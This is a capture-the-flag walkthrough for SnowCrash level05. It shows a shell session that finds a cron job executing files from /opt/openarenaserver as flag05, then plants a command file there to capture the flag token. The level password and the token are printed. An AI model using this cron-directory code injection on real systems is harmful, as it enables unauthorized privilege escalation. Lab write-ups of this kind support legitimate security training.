## level05
```
level04@SnowCrash:~$ su level05 
Password: ne2searoevaevoem4ov4ar8ap
level05@SnowCrash:~$
```
Try connect to `SSH` you get `You have new mail`
```
level05@SnowCrash:~$ cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
We understand from this script that it does a loop for every file in /opt/openarena/server/, execute their contents and then delete that file, therefore let's create a file to execute the getflag command:
```
level05@SnowCrash:~$ echo 'getflag > /tmp/flag05' > /opt/openarenaserver/getmeflag
```
```
level05@SnowCrash:~$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
